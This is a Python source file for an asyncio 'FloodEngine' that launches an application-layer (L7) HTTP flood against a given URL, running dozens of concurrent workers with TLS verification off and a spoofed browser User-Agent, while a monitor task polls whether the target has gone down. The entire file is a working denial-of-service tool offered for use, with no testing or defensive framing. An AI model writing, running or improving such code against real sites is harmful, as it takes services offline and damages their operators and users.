import asyncio
import aiohttp
import time
from typing import List, Dict, Any, Optional, Callable
from utils.logger import logger

class FloodEngine:
    def __init__(self):
        self._session: Optional[aiohttp.ClientSession] = None
        self._is_running = False
        self._stop_event = asyncio.Event()

    async def get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=10),
                connector=aiohttp.TCPConnector(
                    limit=100, # Higher limit for flooding
                    ssl=False,
                    use_dns_cache=True
                )
            )
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()

    async def check_uptime(self, url: str) -> bool:
        """Check if the target URL is up."""
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
                async with session.get(url, ssl=False) as resp:
                    return resp.status < 500
        except Exception:
            return False

    async def run_flood(
        self,
        url: str,
        duration: int,
        concurrency: int = 50,
        on_progress: Optional[Callable[[int, bool], Any]] = None
    ):
        self._is_running = True
        self._stop_event.clear()
        
        session = await self.get_session()
        start_time = time.time()
        requests_sent = 0
        
        logger.info(f"Starting L7 flood on {url} for {duration}s with {concurrency} workers")
        
        async def worker():
            nonlocal requests_sent
            while time.time() - start_time < duration and not self._stop_event.is_set():
                try:
                    async with session.get(url, ssl=False, headers={'User-Agent': 'Mozilla/5.0'}) as resp:
                        await resp.release()
                        requests_sent += 1
                except Exception:
                    pass
                # No sleep for maximum flood, but we respect the semaphore/concurrency via task count
                await asyncio.sleep(0.01) # Tiny sleep to prevent CPU lockup on one worker

        workers = [worker() for _ in range(concurrency)]
        
        # Monitoring task
        async def monitor():
            while time.time() - start_time < duration and not self._stop_event.is_set():
                is_up = await self.check_uptime(url)
                if on_progress:
                    if asyncio.iscoroutinefunction(on_progress):
                        await on_progress(requests_sent, is_up)
                    else:
                        on_progress(requests_sent, is_up)
                await asyncio.sleep(2)

        try:
            await asyncio.gather(monitor(), *workers)
        finally:
            self._is_running = False
            logger.info(f"L7 flood finished. Total requests: {requests_sent}")

    def stop(self):
        self._stop_event.set()
        self._is_running = False
